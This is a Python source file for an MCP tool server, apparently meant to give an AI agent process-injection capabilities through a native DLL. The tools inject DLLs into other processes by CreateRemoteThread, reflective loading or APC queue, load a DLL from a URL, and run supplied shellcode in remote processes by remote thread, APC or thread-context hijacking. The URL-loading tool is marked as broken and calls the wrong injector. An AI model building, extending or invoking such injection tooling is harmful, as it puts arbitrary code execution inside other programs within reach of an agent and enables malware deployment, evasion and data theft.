from core.loader import Loader_x64
from mcp.server.fastmcp import FastMCP


mcp = FastMCP("inject")
loader64 = Loader_x64("core\InjectLib_x64.dll")


@mcp.tool()
async def find_process_id_by_name(process_name: str) -> str | None:
    """find process id number according to process name

    Args:
        process_name (str): process's name need to found process's id
    """
    pid = loader64.get_pid_by_name(process_name=process_name.encode())
    if pid != 0:
        return str(pid)
    else:
        return None


@mcp.tool()
async def create_remote_thread_inject_dll(dll_path: str, process_id: int) -> str | None:
    """using create remote thread method to inject dll into a remote process

    Args:
        dll_path (str): DLL file's path need to injected into remote process
        process_id(int): remote process id need to be injected
    """
    result = loader64.remote_process_inject(
        dll_path=dll_path.encode(), pid=process_id)
    if result:
        return "CreateRemoteThread inject method complete"
    else:
        return None


@mcp.tool()
async def reflect_inject_dll(dll_path: str, process_id: int) -> str | None:
    """using reflect method to inject dll into a remote process

    Args:
        dll_path (str): DLL file's path need to injected into remote process
        process_id(int): remote process id need to be injected
    """
    result = loader64.reflect_dll_inject(
        dll_path=dll_path.encode(), pid=process_id)
    if result:
        return "Reflect inject method complete"
    else:
        return None


@mcp.tool()
async def APC_inject_dll(dll_path: str, process_id: int) -> str | None:
    """using APC Queue method to inject dll into a remote process

    Args:
        dll_path (str): DLL file's path need to injected into remote process
        process_id(int): remote process id need to be injected
    """
    result = loader64.apc_dll_inject(
        dll_path=dll_path.encode(), pid=process_id)
    if result:
        return "APC Queue inject method complete"
    else:
        return None


# TODO: FIX this crap
@mcp.tool()
async def net_inject_dll(url: str, process_id: int) -> str | None:
    """using reflect dll injection method and winint.dll to inject dll from website or internet

    Args:
        url (str): the url path to get dll file on internet
        process_id(int): remote process id need to be injected
    """
    result = loader64.apc_dll_inject(
        dll_path=url.encode(), pid=process_id)
    if result:
        return "net inject method complete"
    else:
        return None


@mcp.tool()
async def remote_shellcode_inject(shellcode: str, process_id: int) -> str | None:
    """using CreateRemoteThread method to run shellcode inside a remote process

    Args:
        shellcode (str): shellcode need to run
        process_id(int): remote process's id to run shellcode
    """
    result = loader64.remote_shellcode_inject(
        based_shellcode=shellcode.encode(), pid=process_id)
    if result:
        return "remote shellcode inject method complete"
    else:
        return None


@mcp.tool()
async def apc_shellcode_inject(shellcode: str, process_id: int) -> str | None:
    """using APC Queue method to run shellcode inside a remote process

    Args:
        shellcode (str): shellcode need to run
        process_id(int): remote process's id to run shellcode
    """
    result = loader64.apc_shellcode_inject(
        based_shellcode=shellcode.encode(), pid=process_id)
    if result:
        return "apc shellcode inject method complete"
    else:
        return None


@mcp.tool()
async def context_shellcode_inject(shellcode: str, process_id: int) -> str | None:
    """using context switch method to run shellcode inside a remote process

    Args:
        shellcode (str): shellcode need to run
        process_id(int): remote process's id to run shellcode
    """
    result = loader64.context_shellcode_inject(
        based_shellcode=shellcode.encode(), pid=process_id)
    if result:
        return "context shellcode inject method complete"
    else:
        return None

if __name__ == "__main__":
    mcp.run(transport='stdio')